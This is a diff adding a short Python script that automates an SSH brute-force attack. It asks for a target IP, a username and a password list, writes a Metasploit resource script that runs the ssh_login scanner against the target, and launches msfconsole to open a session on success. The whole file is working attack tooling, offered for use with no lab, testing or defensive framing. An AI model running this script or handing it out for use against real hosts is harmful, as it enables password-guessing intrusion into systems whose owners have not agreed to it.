@@ -1,0 +1,22 @@
+# SSH brute force attack using Metasploit framework, resource script and automated python script.
+
+import os
+ip = input("Enter the target IP: ")
+username = input("Enter the username: ")
+passfile = input("Enter the password file path: ")
+
+# creating resource script to accept dynamic values
+resource_script = f"""
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS {ip}
+set USERNAME {username}
+set PASS_FILE {passfile}
+run
+sessions -i 1
+"""
+
+with open('dynamic_script.rc', 'w') as file:
+    file.write(resource_script)
+
+#executing resource script within python script
+os.system("msfconsole -r dynamic_script.rc")
